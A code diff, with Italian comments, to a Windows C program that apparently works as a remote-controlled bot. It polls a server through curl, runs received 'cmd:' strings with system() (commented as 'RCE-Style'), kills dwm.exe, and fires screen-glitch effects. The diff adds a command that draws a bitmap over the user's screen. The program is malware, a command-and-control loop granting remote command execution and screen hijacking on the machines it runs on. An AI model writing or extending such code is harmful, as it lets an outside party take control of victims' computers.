@@ -138,10 +138,35 @@ void squarefx_run() {
     ReleaseDC(NULL, hdc);
 }
 
+// ho capito che hdc significa HandleDeviceContext, tradotto: accesso grafico allo schermo
+// Invece GetDC(NULL) si piglia tutto schermo. Forse già lo sapevi
+// DC = DeviceContext
+void bmp_on_screen() {
+    w = GetSystemMetrics(SM_CXSCREEN);
+    h = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdc = GetDC(NULL); // piglia il dc dello schermo
+    HDC memdc = CreateCompatibleDC(hdc); // crea un DC compatibile in ram
+
+    //karika il bmp (assicurati che sia real bmp. Esporta da paint per sicurezza)
+    HBITMAP bmp = (HBITMAP)LoadImageA(NULL, "img1.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
+
+    // usa bitmap nel memdc
+    SelectObject(memdc, bmp);
+
+    BitBlt(hdc, 100, 100, 256, 256, memdc, 0, 0, SRCCOPY);
+
+    //togli merda (aka burn garbage; aka free mem; akak liberation; aka: restituisci risorsa grafica. MUà! )
+    DeleteObject(bmp);
+    DeleteDC(memdc);
+    ReleaseDC(NULL, hdc);
+}
+
 void startfx() {
     w = GetSystemMetrics(SM_CXSCREEN);
     h = GetSystemMetrics(SM_CYSCREEN);
 
+    //yeahhh starta a bestia!
     heightglitch_run();
     widthglitch_run();
     tunnel_run();
@@ -161,12 +186,12 @@ int main() {
         
         if (fgets(reqtextbuffer, sizeof(reqtextbuffer), pointertotextstream) == NULL) { // meaning: fgets(buffer, size, stream), mette l'out di curl dentro il buffer
             pclose(pointertotextstream);
-            printf("Sleeping for 20secs\n");
+            printf("Sleeping for 20secz\n");
             Sleep(20000);
             continue; //quitta da questo if (quindi se continua ad essere NULL riparte e ritorna qui)
         } 
 
-        pclose(pointertotextstream); // chiude il processo creato da popen (curl)
+        pclose(pointertotextstream); // chiude il processo creato da popen (curl) (NEVER FORGET! Altrimenti fai un mem leak più grande di casa mia e più pesante del mio subwoofer con hp e sounbar integrata)
         printf("reqtextbuffer[]: %s\n", reqtextbuffer);
 
         /* 
@@ -183,7 +208,7 @@ int main() {
         "cmd: " - Exec a command
         */
 
-        if (strstr(reqtextbuffer, "1")) { // xtreme, starta tutti gli fx a bestia
+        if (strstr(reqtextbuffer, "1")) {
             int i;
             for(i=0;i<100;i++) {
                 startfx();
@@ -238,12 +263,15 @@ int main() {
             command[strcspn(command, "\r\n")] = '\0'; // toglie eventuali \r\n alla fine, per avoidare esecuzione errata a causa di byte sporchi (apici per char = 1 byte, virgolette per array di char)
             system(command); // esegui (RCE-Style)
             printf("Command Executed\n");
-            printf("Sleeping for 20 secs");
+            printf("Sleeping for 20 secs\n");
             Sleep(20000);
         }
         else if (strstr(reqtextbuffer, "CleanDWM")) {
             system("TASKKILL /F /IM dwm.exe"); // killa dwm (previsto: riavvio automatico di DWM)
             system("start dwm.exe"); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
+        }
+        else if (strstr(reqtextbuffer, "BMPFx1")) {
+            bmp_on_screen();
         }
         else {Sleep(20000);}
     }
